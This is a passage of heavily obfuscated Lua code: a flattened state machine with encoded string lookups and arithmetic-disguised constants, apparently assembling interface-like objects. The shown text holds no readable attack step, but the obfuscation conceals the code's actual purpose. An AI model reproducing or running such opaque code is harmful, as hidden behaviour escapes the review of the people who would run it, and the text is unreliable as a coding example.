N=t(-241166-(-235495))I=Q[j[371603413%3231334]]i=o[N]u=Q[j[962754-962750]]C=Q[j[840570+-840565]]w,r,Y=60786405862466%20262139646278,t(443088-448750),t(1019328+-1024732)T=C(Y,w)v=u[T]f=O[v]Y,T=-654580+11919972411473,t(895891-901628)N=i(f)v=Q[j[557294475%9445669]]u=Q[j[2060288664%14407613]]C=u(T,Y)f=v[C]r=I[r]i=O[f]f=Q[j[-193760-(-193766)]]r=r(I,N,i,f)I=-654388+12594593 elseif I<-167270-(-371052)then N=t(-505456+499776)i=o[N]r,I=i,i and 2395829793%17531416 or 933404977%10033970 elseif I<511650565%13821862 then I=Q[j[1439801473%10433344]]u,v=2502968256433-(-319850),t(361707+-367142)i=Q[j[249356018%1731639]]s=23745450383780-(-965822)N=Q[j[-723315-(-723318)]]f=N(v,u)C,X=t(-725587-(-720054)),t(-515200-(-509552))O=i[f]T=20685194796800-1037248 f=Q[j[479985-479983]]v=Q[j[689272-689269]]u=v(C,T)v=t(92718-98339)N=f[u]f=o[v]C=Q[j[-291173-(-291177)]]Y=Q[j[-603763+603765]]w=Q[j[768952+-768949]]l=w(X,s)w=15178878691640-1044992 T=Y[l]u=C[T]v=f(u)F=t(-252584+246873)u=Q[j[1026114-1026112]]Y=t(749303+-755104)C=Q[j[260075-260072]]T=C(Y,w)X=t(-467310+461721)f=u[T]s=-811129+28914603051433 C=Q[j[3035582004%12240250]]Y=Q[j[141030-141028]]w=Q[j[-485103+485106]]l=w(X,s)T=Y[l]u=C[T]l,X=t(159269+-164965),129188+1183299472298 T=Q[j[-12190-(-12192)]]Y=Q[j[126627929%1544243]]w=Y(l,X)X=t(-565298+559607)C=T[w]Y=t(-539569+533948)T=o[Y]z=730295+23249366757341 l=o[X]s=Q[j[422829+-422827]]y=Q[j[681141+-681138]]B=y(F,z)X=s[B]w=l[X]F=t(-804357-(-798713))Y=T(w)w=Q[j[176835906%10402112]]y,s=-508720+9024002188292,t(567431-572914)l=Q[j[602035+-602032]]X=l(s,y)T=w[X]z,X=461486+26132451808355,t(249064+-254755)l=o[X]s=Q[j[-714548-(-714550)]]y=Q[j[-469295+469298]]B=y(F,z)X=s[B]w=l[X]i={[N]=v,[f]=u;[C]=Y,[T]=w}r=I(O,i)r,I={},o[t(-175269+169692)]else I=r and 8305950-(-172005)or-1018944+13729220 end else if I<969406+-228008 then r,I={},o[t(618063-623859)]elseif-603955+1411403>I then T,q=C,16674645530693-(-124004)r=b()Q[r]=Y Y,X,w=r,t(591282+-596747),438363289%9962802 r=f+w f,F,z=r,t(854995-860795),808569+25977827919880 l=o[X]H=t(-304933-(-299241))s=Q[j[-811193+811195]]y=Q[j[766441024%3971197]]B=y(F,z)R,F=t(1031580-1037312),t(-613875+608508)X=s[B]w=l[X]z=28431404691630-1018176 s=Q[j[651097078%2735702]]y=Q[j[1293421747%7029466]]B=y(F,z)X=s[B]l=w(X)X=Q[j[538520257%8284927]]B=t(-775767-(-770360))s=Q[j[1912466853%16071150]]F=-1011199+2242042361383 y=s(B,F)w=X[y]y=t(-736695+730997)s=o[y]B=Q[j[901822-901820]]F=Q[j[73637-73634]]z=F(R,q)y=B[z]X=s[y]z,F,B,y=375916+-375886,2495694215%11500895,288105+-288111,213823975%2741333 s=X(y,B,F,z)l[w]=s B=t(669045+-674644)X=Q[j[758638474%7511272]]F=17467090382542-(-921789)s=Q[j[228586-228583]]y=s(B,F)B=I w=X[y]s=I R=Q[Y]a=28698774215708-668597 m=Q[j[556640462%12369788]]p=Q[j[305726436%1227817]]S=p(H,a)q=m[S]z=R[q]R=Q[j[-600043-(-600051)]]F=z==R I,y=F and 451886+6693804 or 15269875-809529,F else I=-475311+11823625 H=k(H)m=k(m)p=k(p)S=k(S)Z=k(Z)L=nil a=k(a)end end else if I>-549489+1660050 then if I<1048923382%13968042 then I=3272580-416557 elseif I<2342567-841594 then r=t(-148367-(-142692))I=o[r]r={I(O)}r,I={W(r)},o[t(336500-342123)]else N=Q[j[3135665969%12851090]]f,I,i=N,{},39265+-39264 O,N=I,139959745%985632 v=N N=-683957+683957 u,I=v<N,8067030-(-206630)N=i-v end else if 402078181%14854853>I then r,I={},o[t(87797-93603)]elseif 2744788369%15678431>I then I=389032133%2404426<4398348177%19418194 Q[i]=I I=28641+14645215 else T,C,Y,O,N,i=11097460757385-338730,t(853370+-859006),t(-798712-(-792953)),U[-807288-(-807289)],t(-521648+516183),U[234473-234471]r=o[N]f=Q[j[586355-586354]]v=Q[j[-525870-(-525872)]]u=v(C,T)C=t(712054+-717676)N=f[u]I=r[N]f=Q[j[2182747855%16411638]]T=22047814487213-769144 v=Q[j[160391018%5940408]]u=v(C,T)N=f[u]r=I(N)C,N=22971260730252-862203,r r=Q[j[444014+-444013]]f=Q[j[254632+-254630]]u=t(489839+-495492)v=f(u,C)I=r[v]v=t(40281-45985)f=o[v]w=4.98854274564e+014%17201871628005 u=Q[j[1972304837%12482942]]C=Q[j[-322602+322604]]T=C(Y,w)v=u[T]r=f[v]v,C,T=798457-798457,I,156843-156837 C,u=t(-990143+984709),i or T f=r(v,u)N[I]=f T=12427867507937-368555 f=Q[j[-309994+309995]]v=Q[j[552519152%2986590]]I=o[t(623731+-629097)]u=v(C,T)r=f[u]f,i=O,nil N[r]=f r,N,O={},nil,nil end end end else if 2094367-(-224551)>I then if I>2355367-385388 then if 2813557-685621>I then f=t(190694+-196267)N=o[f]v=Q[j[2014638593%7869682]]I,Y=638196+5390276,609907+901970048213 u=Q[j[2869720252%11478881]]T=t(-753033-(-747383))C=u(T,Y)f=v[C]i=N[f]r=i elseif I<3134399-852858 then q,p=t(764600+-770221),t(-9642-(-3872))z=o[q]m=o[p]I=15223793-(-497647)q=z(m)z=t(281563-287209)o[z]=q else I=r and-278761+7992788 or 12336793-39201 end else if 395835166%4987800>I then r=t(302377+-308052)I=o[r]I=I and 393708+1096769 or 2150108418%18234926 elseif I<1739028-(-156965)then I,r=o[t(687376-692789)],{}else I=r and 1273250260%12054896 or 580224812%17824800 end end else if I>-651892+3158976 then if I<2218404-(-337066)then F,p,m=t(-242344+236537),18868367593170-444974,t(417261+-423008)B=o[F]I=2203037874%21489808 z=Q[j[79394+-79392]]R=Q[j[-646260+646263]]q=R(m,p)F=z[q]y=B[F]z,F,R=42977+-42949,-836638-(-836666),181706-181670 B=y(F,z,R)X=B elseif I<3593614-1030208 then f,v=i,I I=i and 6934068-209767 or 2047262297%25069822 else N=t(-340011+334438)i=o[N]r,I=i,i and 2211043-230567 or 69090+5959382 end else if 92259+2306533>I then a=t(-767608+762143)H=o[a]E,g=t(308714+-314519),19332237198178-(-574194)Z=Q[i]tR=-670773+4494821117071 L=Q[f]c=L(E,g)a=Z[c]S=H[a]Z=Q[i]L=Q[f]g,x,E=17903044810017-1020928,t(721398+-727127),t(-862907+857115)c=L(E,g)a=Z[c]c=t(-588018+582581)H=S(a)a=Q[i]Z=Q[f]g,E=-761656+12690942676323,3384537524592-7456 L=Z(c,E)S=a[L]E=t(607987+-613432)Z=Q[i]L=Q[f]c=L(E,g)a=Z[c]H[S]=a a=Q[i]Z=Q[f]E,c=25237998825929-792057,t(-603187+597607)L=Z(c,E)S=a[L]a=6771502-(-861115)<=-731959+881980 H[S]=a c,E=t(-197926+192113),256631860743-(-266984)a=Q[i]Z=Q[f]L=Z(c,E)S=a[L]c=t(-310250+304864)L=o[c]E=Q[i]g=Q[f]J=g(x,tR)c=E[J]Z=L[c]c=Q[i]IR,WR=t(325290+-330956),7586217241329-(-258216)E=Q[f]x,J=3010864808046-849274,t(-37214-(-31841))g=E(J,x)L=c[g]a=Z[L]H[S]=a J,E,c,x=t(286967-292329),31071814489101-(-908540),t(263255-268968),505520+3246020089119 a=Q[i]Z=Q[f]L=Z(c,E)Z=t(1013823+-1019329)S=a[L]a=Q[Y]c=Q[i]E=Q[f]Z=a[Z]g=E(J,x)L=c[g]Z=Z(a,L)a=h(552752-(-518384),{i,f})L=t(492054-497519)H[S]=Z S=b()Q[S]=a Z=o[L]J=t(-453230+447789)c=Q[i]x=27899885079962-(-169957)E=Q[f]g=E(J,x)L=c[g]a=Z[L]J=t(-16993+11488)c=Q[i]x=-878011+14990967970884 E=Q[f]g=E(J,x)x=-548721+670035894753 L=c[g]Z=a(L)a=b()rR=259112+9471765425741 Q[a]=Z J=t(999295+-1004977)Z=Q[a]c=Q[i]E=Q[f]g=E(J,x)L=c[g]g=t(898426-904124)E=o[g]J=Q[i]x=Q[f]tR=x(IR,WR)g=J[tR]c=E[g]g,IR,J,x,tR=439854-439854,t(-364186-(-358827)),-828098-(-828538),73250-73250,127795830%4259848 E=c(g,J,x,tR)x=29602892755696-1001279 Z[L]=E WR=13776527084065-(-944125)Z=Q[a]c=Q[i]E=Q[f]J=t(383532+-389292)g=E(J,x)L=c[g]g=t(625394-631092)E=o[g]J=Q[i]x=Q[f]jR=t(589554+-595284)tR=x(IR,WR)g=J[tR]c=E[g]tR,g,J,x=-153896-(-153701),2339886470%16594939.5,596374-596594,-710134+710134.5 E=c(g,J,x,tR)Z[L]=E Z=Q[a]c=Q[i]IR,x,J=t(510512+-516066),980990+25949909608041,t(-575090+569366)E=Q[f]g=E(J,x)WR=13138706067185-147237 L=c[g]g=t(98467+-104274)E=o[g]J=Q[i]x=Q[f]tR=x(IR,WR)g=J[tR]c=E[g]J,x,g=-729207+729217,1857131609%15348195,-976564-(-976574)E=c(g,J,x)x=714230+33554381542427 Z[L]=E J=t(443275-449070)Z=Q[a]c=Q[i]E=Q[f]g=E(J,x)L=c[g]c=372460+-372460 Z[L]=c Z=Q[a]J=t(447278+-452748)c=Q[i]E=Q[f]x,tR=25379736415800-135652,13636938081363-750263 g=E(J,x)L=c[g]c=12971116-(-248104)<=-926461+15730369 Z[L]=c J=t(600837-606515)Z=Q[a]x=899900+16771284468167 c=Q[i]E=Q[f]g=E(J,x)x=256424+27624998697687 L=c[g]c=2323944-1029568<=778040+6551976 Z[L]=c Z=Q[a]c=Q[i]E=Q[f]J=t(-335210+329455)g=E(J,x)E=213937-213927 L=c[g]WR,c=24454142591958-10976,H Z[L]=c Z=Q[S]c=Q[a]x=t(95907+-101337)L=Z(c,E)c=t(-689038-(-683573))L=o[c]IR=t(425567-431277)E=Q[i]fR=746551+12537391401317 g=Q[f]J=g(x,tR)c=E[J]Z=L[c]tR,x=840250+26117418585289,t(-63266+57535)E=Q[i]g=Q[f]J=g(x,tR)c=E[J]L=Z(c)J=t(-978878+973125)x=463406+16022864013340 c=Q[i]E=Q[f]g=E(J,x)Z=c[g]g=t(410797+-416495)E=o[g]J=Q[i]x=Q[f]tR=x(IR,WR)QR=1037056+34361859713537 g=J[tR]J,WR,tR=1373966304%12052336,801529+12951868339237,78885040%3585682 c=E[g]g,x=-532272+532273,137489055%1195557 E=c(g,J,x,tR)L[Z]=E c=Q[i]J=t(730793-736311)E=Q[f]x=-261800+7313479014723 g=E(J,x)Z=c[g]g=t(565490+-571297)E=o[g]J=Q[i]IR=t(-831767-(-826042))x=Q[f]tR=x(IR,WR)IR=-902588+127780079155 g=J[tR]J=956578490%4598935 c=E[g]g,x=1005203-1005183,202150+-202114 E=c(g,J,x)L[Z]=E J=t(-473583+467889)c=Q[i]x=-72994+3828006497039 E=Q[f]g=E(J,x)Z=c[g]UR,c=-208806+21067457723466,-196390+196390 L[Z]=c J=t(691261-697078)c=Q[i]x=-235303+27049456007566 E=Q[f]g=E(J,x)Z=c[g]c=Q[a]E=521840+-521830 L[Z]=c Z=Q[S]c=Z(L,E)tR,E=t(-947389+941885),t(-679310-(-673845))c=o[E]g=Q[i]J=Q[f]x=J(tR,IR)E=g[x]Z=c[E]tR,IR=t(-385964+380361),114276+20130052180695 g=Q[i]J=Q[f]x=J(tR,IR)tR=-757303+27971828904953 E=g[x]c=Z(E)WR=t(-309924-(-304553))E=Q[i]x=t(1023999-1029376)g=Q[f]J=g(x,tR)Z=E[J]J=t(361195+-366893)g=o[J]x=Q[i]tR=Q[f]IR=tR(WR,UR)tR=-91619+91620 J=x[IR]IR,x=-211431-(-211431),517936+-517976 E=g[J]J,WR=416499172%12621187,t(170310-175781)g=E(J,x,tR,IR)x,AR,tR=t(424498-430317),-886843+27414540020726,-325866+17539034527928 c[Z]=g E=Q[i]g=Q[f]UR=625203+6408286145821 J=g(x,tR)Z=E[J]J=t(259880+-265578)g=o[J]x=Q[i]tR=Q[f]IR=tR(WR,UR)tR=130488284%1124899 J=x[IR]WR,IR=16156013279613-753335,495663-495663 E=g[J]J,x=196646+-196646,925705-925693 g=E(J,x,tR,IR)tR=595378+18816825372354 c[Z]=g x=t(-661869-(-656244))E=Q[i]g=Q[f]J=g(x,tR)Z=E[J]tR,E=-64226+3840891783387,12773839%304139 c[Z]=E x,IR=t(-190502+184688),t(380132-385900)E=Q[i]g=Q[f]J=g(x,tR)Z=E[J]J=Q[i]x=Q[f]tR=x(IR,WR)g=J[tR]x=Q[Y]IR=Q[i]WR=Q[f]UR=WR(jR,AR)WR=t(224743+-230356)tR=IR[UR]J=x[tR]E=g..J c[Z]=E E=Q[i]tR,x,UR=15524633420773-355179,t(-842042+836549),31431530310469-424173 g=Q[f]J=g(x,tR)Z=E[J]J=t(-65553-(-59746))g=o[J]x=Q[i]tR=Q[f]IR=tR(WR,UR)tR=555377+-555317 J=x[IR]E=g[J]J,x,bR=-646260+646515,672213-672053,18269200943127-17825 g=E(J,x,tR)c[Z]=g x=t(-296762-(-291113))E=Q[i]g=Q[f]tR=-392364+28487240344654 J=g(x,tR)Z=E[J]jR,UR,E=34984650715643-701110,t(929661+-935361),2377897816%13745074 c[Z]=E x,tR=t(88569-94115),34504671867914-(-903548)E=Q[i]g=Q[f]J=g(x,tR)x=t(-527984+522598)Z=E[J]J=o[x]tR=Q[i]IR=Q[f]WR=IR(UR,jR)x=tR[WR]WR=t(-205798+200435)g=J[x]UR=467091842128-(-105827)x=Q[i]jR=-643764+31311267775644 tR=Q[f]IR=tR(WR,UR)tR=203174+12527727973357 J=x[IR]x=t(-572469-(-566834))E=g[J]c[Z]=E E=Q[i]g=Q[f]J=g(x,tR)Z=E[J]UR,x=t(-360397-(-354987)),t(-3242-2144)J=o[x]tR=Q[i]IR=Q[f]WR=IR(UR,jR)x=tR[WR]g=J[x]WR=t(-1006655+1001067)x=Q[i]tR=Q[f]UR=601779+28792191334923 IR=tR(WR,UR)J=x[IR]E=g[J]tR=811897+10353333813809 c[Z]=E E=Q[i]g=Q[f]x=t(594674+-600137)J=g(x,tR)Z=E[J]IR,E,g=t(-774941-(-769464)),L,t(-575883-(-570418))c[Z]=E E=o[g]jR=-917884+22650202182626 J=Q[i]x=Q[f]WR=-999615+1048005002383 tR=x(IR,WR)g=J[tR]Z=E[g]J=Q[i]x=Q[f]WR,IR=34926667007368-820857,t(777208+-782695)tR=x(IR,WR)UR=t(45025+-50635)g=J[tR]AR=621363+9714438121508 E=Z(g)g=Q[i]IR=-255272+4105040524311 J=Q[f]tR=t(-258615-(-252840))x=J(tR,IR)Z=g[x]x=t(-814011-(-808313))J=o[x]tR=Q[i]IR=Q[f]WR=IR(UR,jR)x=tR[WR]WR=-334186+334210 g=J[x]IR,x,tR,jR=294505+-294505,435373+-435373,953113796%4312732,-897532+9925973235224 J=g(x,tR,IR,WR)E[Z]=J IR=745655+1898432734769 g=Q[i]UR=t(-134692+129037)J=Q[f]tR=t(-913412-(-907900))x=J(tR,IR)Z=g[x]x=t(473261-478959)J=o[x]tR=Q[i]IR=Q[f]WR=IR(UR,jR)x=tR[WR]g=J[x]WR,x,tR,jR,IR=665083006%13301660,924989+-924988,40901-40929,15055394408383-839930,872635+-872635 J=g(x,tR,IR,WR)E[Z]=J g=Q[i]OR,tR=t(-459438+453953),t(774072+-779751)J=Q[f]IR=391788+14843859581844 x=J(tR,IR)Z=g[x]x=t(-254487-(-248680))J=o[x]UR=t(-353698-(-347883))tR=Q[i]IR=Q[f]WR=IR(UR,jR)IR=151497320%784960 x=tR[WR]tR=-726863-(-726903)g=J[x]x=282345+-282165 J=g(x,tR,IR)E[Z]=J IR=-883323+33079774769874 g=Q[i]tR=t(730210-735735)J=Q[f]x=J(tR,IR)Z=g[x]IR=t(479241-484655)J=Q[i]x=Q[f]UR,WR=t(-849338+843906),31457300795866-319338 tR=x(IR,WR)g=J[tR]E[Z]=g tR,dR=t(878843+-884667),967358+18137125683005 g=Q[i]J=Q[f]IR=-825338+28697700597856 x=J(tR,IR)Z=g[x]x=t(-141331-(-135524))J=o[x]jR=15315247651819-631860 tR=Q[i]IR=Q[f]WR=IR(UR,jR)x=tR[WR]g=J[x]IR,x,tR=2550590583%16349938,603123+-602868,323836933%2062654 J=g(x,tR,IR)E[Z]=J g=Q[i]IR=-829818+25384032208338 J=Q[f]tR=t(-289001+283216)x=J(tR,IR)Z=g[x]IR,tR,jR,g=1140349330524-712758,t(943485+-949113),t(-256872+251109),1247322141%5996741 E[Z]=g g=Q[i]J=Q[f]x=J(tR,IR)tR=t(-559665+554279)Z=g[x]x=o[tR]IR=Q[i]WR=Q[f]iR=-597939+22036002795485 UR=WR(jR,AR)tR=IR[UR]jR=16192521454042-591602 J=x[tR]UR=t(-931309-(-925821))tR=Q[i]IR=Q[f]WR=IR(UR,jR)x=tR[WR]AR=t(137188+-142905)g=J[x]E[Z]=g WR,tR=16458815978082-(-983422),t(685621+-691088)g=Q[i]IR=11539855833764-282793 J=Q[f]x=J(tR,IR)J=1193865556%6418632 Z=g[x]g=L E[Z]=g Z=Q[S]g=Z(E,J)J=Q[i]IR=t(859758-865531)x=Q[f]tR=x(IR,WR)g=J[tR]J=h(30730157%6430917,{a,i,f})Z=E[g]g,UR=t(-60453-(-54946)),-355499+1270275699018 g=Z[g]g=g(Z,J)J,WR=t(-146981+141516),t(-463662+458151)g=o[J]x=Q[i]tR=Q[f]IR=tR(WR,UR)PR=-95075+16588743782332 J=x[IR]Z=g[J]UR=-748791+17995389152878 x=Q[i]WR=t(-73634+67991)tR=Q[f]IR=tR(WR,UR)WR=t(910012+-915606)J=x[IR]g=Z(J)Z=b()Q[Z]=g g=Q[Z]x=Q[i]UR=-391212+13683110029811 tR=Q[f]IR=tR(WR,UR)J=x[IR]IR=t(282729+-288427)tR=o[IR]WR=Q[i]UR=Q[f]jR=UR(AR,dR)IR=WR[jR]WR,jR=1412822335%13455449,391678-391660 x=tR[IR]UR,IR=382508-382508,520304+-520304 tR=x(IR,WR,UR,jR)g[J]=tR UR,WR=12341964431791-(-740151),t(-812718-(-807033))g=Q[Z]x=Q[i]AR=t(-556300-(-550641))tR=Q[f]IR=tR(WR,UR)J=x[IR]IR=t(-758329-(-752631))tR=o[IR]WR=Q[i]dR=79040679270200%7904069387903 UR=Q[f]jR=UR(AR,dR)UR=835066+-835066 IR=WR[jR]jR=53154+-53110 x=tR[IR]IR,WR=543473+-543473,-365035+365043 tR=x(IR,WR,UR,jR)UR=31282275600057-382188 g[J]=tR g=Q[Z]x=Q[i]dR,WR=-26657+30570362689367,t(415292-421037)tR=Q[f]IR=tR(WR,UR)J=x[IR]x,WR,UR=-408236-(-408237),t(703880-709622),-265256+9204396076452 g[J]=x g=Q[Z]x=Q[i]tR=Q[f]jR=30764716326297-462254 IR=tR(WR,UR)J=x[IR]tR=Q[i]UR,AR=t(443140-448558),t(-900732+895120)IR=Q[f]WR=IR(UR,jR)x=tR[WR]g[J]=x UR=5.1575344639435e+014%30338438690233 g=Q[Z]x=Q[i]WR=t(-1013197-(-1007615))tR=Q[f]IR=tR(WR,UR)J=x[IR]IR=t(-135571-(-129764))tR=o[IR]WR=Q[i]UR=Q[f]jR=UR(AR,dR)UR=755831+-755681 IR=WR[jR]x=tR[IR]IR,WR=-163685+163835,838032-837882 tR=x(IR,WR,UR)g[J]=tR g=Q[Z]UR=3241725176161-(-320106)x=Q[i]dR=t(-481961-(-476271))tR=Q[f]WR=t(-375532+369983)IR=tR(WR,UR)WR=t(-385772+380382)J=x[IR]x,UR=-574002+574013,25742673103717-1011135 g[J]=x g=Q[Z]x=Q[i]tR=Q[f]IR=tR(WR,UR)J=x[IR]WR=t(-1039040+1033654)IR=o[WR]UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]dR=462510+22358134112936 tR=IR[WR]WR=Q[i]UR=Q[f]rR,AR=12296866719326-80290,t(-36089-(-30561))jR=UR(AR,dR)IR=WR[jR]x=tR[IR]g[J]=x g=Q[Z]x=Q[i]UR,WR=150949+2050909321681,t(-469186-(-463726))tR=Q[f]IR=tR(WR,UR)dR,WR=t(-689589+683843),t(280415-285801)J=x[IR]IR=o[WR]UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]tR=IR[WR]WR=Q[i]AR,dR=t(108131+-113686),32479533845319-(-43745)UR=Q[f]jR=UR(AR,dR)IR=WR[jR]rR,I,WR=-542769+772044475136,o[t(-185126+179563)],t(-597299+591488)x=tR[IR]UR,jR=522544+34528295289964,21379925026187-(-895036)g[J]=x g=Q[Z]x=Q[i]tR=Q[f]IR=tR(WR,UR)J=x[IR]x=Q[a]g[J]=x UR,x,dR=t(-750283-(-744503)),t(396947-402412),t(260200+-265697)J=o[x]tR=Q[i]IR=Q[f]WR=IR(UR,jR)jR=-246312+14469112886987 x=tR[WR]g=J[x]tR=Q[i]IR=Q[f]UR=t(-60674-(-55266))WR=IR(UR,jR)x=tR[WR]jR=46945+6910813233603 J=g(x)g=b()Q[g]=J J=Q[g]tR=Q[i]UR=t(-336694-(-331242))IR=Q[f]WR=IR(UR,jR)x=tR[WR]WR=t(501232+-506930)IR=o[WR]UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]tR=IR[WR]jR,AR,UR,dR,WR=-798201-(-798201),422957+-422637,332584-332394,t(678965+-684673),51682-51682 IR=tR(WR,UR,jR,AR)jR,UR=6859272181207-81123,t(-679989+674202)J[x]=IR J=Q[g]tR=Q[i]IR=Q[f]WR=IR(UR,jR)x=tR[WR]WR=t(-36963-(-31265))IR=o[WR]UR=Q[i]rR=22823079157357-183142 jR=Q[f]AR=jR(dR,rR)WR=UR[AR]AR=-772600+772664 tR=IR[WR]jR,UR,WR,dR=791609-791609,-205542+205550,2657586540%15632862,t(-505563-(-500079))IR=tR(WR,UR,jR,AR)J[x]=IR UR,rR=t(-10399-(-4576)),20229913740421-408301 J=Q[g]tR=Q[i]IR=Q[f]jR=3701301737069-714998 WR=IR(UR,jR)x=tR[WR]WR=t(-379035-(-373228))IR=o[WR]UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]tR=IR[WR]jR,WR,UR=-137036-(-137060),-410989+411007,911822-911804 IR=tR(WR,UR,jR)J[x]=IR UR=t(593660-599411)J=Q[g]jR=-876987+9507201123409 tR=Q[i]IR=Q[f]WR=IR(UR,jR)x=tR[WR]tR=401660910%13388697 J[x]=tR UR=t(362539+-368087)J=Q[g]tR=Q[i]jR=17709763633014-(-729335)IR=Q[f]WR=IR(UR,jR)x=tR[WR]tR,jR=300908-300905,-328298+15843544448013 J[x]=tR J=Q[g]tR=Q[i]IR=Q[f]UR=t(984500-990015)WR=IR(UR,jR)x=tR[WR]dR,WR=t(244968+-250702),t(-115237-(-109539))IR=o[WR]UR=Q[i]jR=Q[f]rR=12714564216458-(-739255)AR=jR(dR,rR)WR=UR[AR]tR=IR[WR]jR,AR,WR,UR=-36385-(-36385),480367-480367,-395436-(-395436),482607-482607 IR=tR(WR,UR,jR,AR)J[x]=IR J=Q[g]tR=Q[i]UR=t(298921+-304698)IR=Q[f]AR,rR,jR,NR=703734+6621967211297,t(-3744+-1662),176677+28137189258295,-253800+34033285978935 WR=IR(UR,jR)x=tR[WR]jR,IR=t(-214527-(-209126)),811513+-811507 tR=Q[a]J[x]=tR J=Q[S]tR=Q[g]x=J(tR,IR)tR=t(-185062+179597)x=o[tR]IR=Q[i]WR=Q[f]UR=WR(jR,AR)AR=26646790551448-251560 tR=IR[UR]jR=t(-854778+849185)J=x[tR]IR=Q[i]WR=Q[f]UR=WR(jR,AR)tR=IR[UR]c=nil x=J(tR)jR,UR=28515157743633-(-348075),t(805607-811193)tR=Q[i]IR=Q[f]WR=IR(UR,jR)UR=t(143396+-148782)J=tR[WR]WR=o[UR]jR=Q[i]AR=Q[f]dR=AR(rR,QR)UR=jR[dR]IR=WR[UR]rR,dR=6364262715421-702710,t(-626214-(-620723))UR=Q[i]jR=Q[f]AR=jR(dR,rR)jR=32443024866257-(-686645)WR=UR[AR]tR=IR[WR]dR=t(-1009151+1003779)x[J]=tR tR=Q[i]IR=Q[f]UR=t(360919-366635)WR=IR(UR,jR)J=tR[WR]rR,WR=-430893+26362240463636,t(-481335-(-475631))IR=o[WR]UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]UR=-226596-(-226599)tR=IR[WR]WR=-865531+865531 IR=tR(WR,UR)jR,dR=724918+9753093903301,t(461946-467502)x[J]=IR tR=Q[i]UR,rR=t(129676-135460),-889020+23922625046467 IR=Q[f]WR=IR(UR,jR)J=tR[WR]WR=t(-485167+479702)tR=Q[g]x[J]=tR J=703467796%10049537 IR=o[WR]UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]dR=t(648695-654516)tR=IR[WR]rR=34010735658625-(-800057)UR=Q[i]jR=Q[f]E=nil AR=jR(dR,rR)WR=UR[AR]IR=tR(WR)tR=b()Q[tR]=IR IR=Q[tR]dR=t(870971+-876673)UR=Q[i]rR=26679003413546-(-124132)jR=Q[f]AR=jR(dR,rR)WR=UR[AR]AR=t(-921854-(-916156))jR=o[AR]dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]QR,OR=939023-939005,t(-944573+938802)UR=jR[AR]AR,dR,rR=-278121+278121,675765+-675541,548529-548529 jR=UR(AR,dR,rR,QR)bR=28632198658862-(-863483)IR[WR]=jR dR=t(-1018560+1012944)IR=Q[tR]rR=-126180+1931720618987 UR=Q[i]jR=Q[f]l=k(l)AR=jR(dR,rR)WR=UR[AR]AR=t(952700-958398)jR=o[AR]dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]UR=jR[AR]rR,AR,dR=-44469-(-44513),-14368+14368,926333+-926333 jR=UR(AR,J,dR,rR)IR[WR]=jR IR=Q[tR]UR=Q[i]rR,QR=16683236320544-469103,907196+28940371923340 jR=Q[f]dR=t(508101-513520)AR=jR(dR,rR)WR=UR[AR]dR,UR=t(593239-598771),136091281%2567760 IR[WR]=UR rR=-528176+2748863486256 IR=Q[tR]UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]jR=Q[i]rR=t(-76309-(-70690))AR=Q[f]bR=21862051399037-685557 dR=AR(rR,QR)UR=jR[dR]IR[WR]=UR IR=Q[tR]UR=Q[i]jR=Q[f]rR,dR=17046172015854-351979,t(502803-508464)AR=jR(dR,rR)WR=UR[AR]OR,AR=t(-795579-(-790136)),t(804281+-810088)jR=o[AR]dR=Q[i]rR=Q[f]QR=rR(OR,bR)rR=149029+-148949 AR=dR[QR]dR=-111131-(-111331)UR=jR[AR]AR=498128725%14232242 jR=UR(AR,dR,rR)IR[WR]=jR rR,dR=-440878+32305582845876,t(-898760-(-893372))IR=Q[tR]UR=Q[i]jR=Q[f]AR=jR(dR,rR)rR,bR=6281580778344-(-590706),t(510704+-516085)WR=UR[AR]UR=52207-52194 IR[WR]=UR vR=31694603653262-(-1008319)IR=Q[tR]dR=t(-567538+561973)UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]dR=t(142372+-147758)AR=o[dR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)iR=-67362+21751451997763 dR=rR[OR]jR=AR[dR]dR=Q[i]OR=t(-694646+689178)rR=Q[f]bR=1860851239457-(-130212)QR=rR(OR,bR)AR=dR[QR]bR=t(-498415+492934)UR=jR[AR]IR[WR]=UR rR=543217+20890284163598 IR=Q[tR]dR=t(416009-421421)UR=Q[i]jR=Q[f]AR=jR(dR,rR)WR=UR[AR]dR=t(-475193-(-469807))AR=o[dR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)bR=27346890909391-(-425133)dR=rR[OR]jR=AR[dR]dR=Q[i]OR=t(-606506-(-601075))rR=Q[f]QR=rR(OR,bR)AR=dR[QR]UR=jR[AR]IR[WR]=UR QR,iR=-682421+30897864595996,-185574+31329521485535 IR=Q[tR]rR=20505873915977-513456 UR=Q[i]dR=t(-31943-(-26273))jR=Q[f]AR=jR(dR,rR)WR=UR[AR]rR=t(938418-943997)UR=Q[a]IR[WR]=UR UR=t(-501704-(-496239))WR=o[UR]jR=Q[i]bR=t(-227751+222182)AR=Q[f]dR=AR(rR,QR)rR=t(1010431+-1015791)UR=jR[dR]QR=23774442571656-(-691957)IR=WR[UR]jR=Q[i]AR=Q[f]dR=AR(rR,QR)UR=jR[dR]WR=IR(UR)rR=t(-675125+669602)IR=b()Q[IR]=WR WR=Q[IR]jR=Q[i]AR=Q[f]QR=4.8957730191932e+014%9599555141158 dR=AR(rR,QR)UR=jR[dR]dR=t(-824251-(-818553))AR=o[dR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)r={}dR=rR[OR]QR,OR=-227751+227751,689077+-689037 jR=AR[dR]dR,rR=-793465-(-793465),-607027+607251 AR=jR(dR,rR,QR,OR)rR=t(-724217-(-718518))WR[UR]=AR iR,QR,bR=11039475958389-(-632244),6166687166725-(-320874),t(-703158+697599)WR=Q[IR]jR=Q[i]AR=Q[f]dR=AR(rR,QR)UR=jR[dR]dR=t(-693431-(-687733))AR=o[dR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)dR=rR[OR]rR=-37025-(-37025)jR=AR[dR]dR,QR=467088328%13737892,833210-833146 